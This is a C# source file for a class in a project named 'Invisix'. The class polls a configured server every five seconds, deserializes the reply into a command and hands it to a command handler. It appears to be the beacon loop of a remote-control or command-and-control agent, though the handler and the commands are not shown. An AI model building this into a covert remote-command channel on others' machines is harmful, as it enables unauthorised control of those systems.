using System;
using System.Net.Http;
using System.Threading.Tasks;
using Newtonsoft.Json;


namespace Invisix
{
    
    class Listener
    {

        private HttpClient client;
        private CommandHandler handler;
        private Config config;


        public Listener()
        {
            client = new HttpClient();
            config = new Config();
            EncryptionService.Init(config);

            handler = new CommandHandler();
            Log.r("Listener initiated");
        }
        
        public async Task StartListening()
        {
            Log.r("start listening");
            while (true)
            {
                try
                {
                    string response = await client.GetStringAsync(config.serverUrl);
                    Log.r(response);
                    Command cmd = JsonConvert.DeserializeObject<Command>(response);

                    handler.Handle(cmd);
                }
                catch (Exception ex)
                {
                    Log.r(ex.ToString());
                    Console.WriteLine(ex.ToString());
                }
                finally
                {
                    await Task.Delay(5000);
                }
            }
        }
    }
}
